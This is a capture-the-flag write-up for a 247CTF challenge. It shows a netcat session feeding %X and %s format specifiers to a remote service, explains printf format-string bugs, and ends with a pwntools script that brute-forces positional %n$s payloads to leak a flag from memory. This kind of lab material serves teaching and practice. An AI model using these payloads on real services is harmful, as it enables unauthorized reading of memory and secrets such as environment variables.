# CONFUSED ENVIRONMENT READ

Can you abuse our confused environment service to read flag data hidden in an environment variable?

---

Thers's no binary file this time.

let's connect to the challenge:

---

```bash
❯ nc 85ddfb51ed35bf14.247ctf.com 50083
Argh, I can't see who you are!
What's your name again?
%S
Oh, that's right! Welcome back !
Argh, I can't see who you are!
What's your name again?
%X
Oh, that's right! Welcome back 5664E877!
Argh, I can't see who you are!
What's your name again?
%s%s
Oh, that's right! Welcome back 
 eWeW`W`W`W`W`W`W!
Argh, I can't see who you are!
What's your name again?

Oh, that's right! Welcome back !
Argh, I can't see who you are!
What's your name again?
%s
Oh, that's right! Welcome back 
!
Argh, I can't see who you are!
What's your name again?
%s
Oh, that's right! Welcome back 
!
Argh, I can't see who you are!
What's your name again?
%s
Oh, that's right! Welcome back 
!
Argh, I can't see who you are!
What's your name again?
%s
Oh, that's right! Welcome back 
!
Argh, I can't see who you are!
What's your name again?
%s%s%s
Oh, that's right! Welcome back 
 gWgW`W`W`W`W`W`W(!
Argh, I can't see who you are!
What's your name again?
```

---


In essence, the vulnerability arises from the variable number of arguments that printf and all other functions in the family have. The quantity of format specifiers (characters beginning with %) in the format string itself determines the amount of parameters. Put differently, a format string such as printf("Exploit %s, not %s.", "code", "people"); expects two arguments, and the function will pull them from the stack regardless of whether the function was called correctly. In other words, even though four parameters were not supplied when calling the function, the expression printf("%x%x%x%x"); will print four arguments from the stack as hexadecimal.


---


exploit:

---

```python3
from pwn import *

for index in range(1,100):
	payload = "%{}$s".format(index)
	binary = remote("URL", PORT)

	binary.recv()
	binary.sendline(payload)
	response = binary.recv()

	try:
		if b"247CTF" in response:
			print("[+] found the flag {}.".format(index))
			print(response)
			break

	except Exception as ex:
		binary.close()

```

---
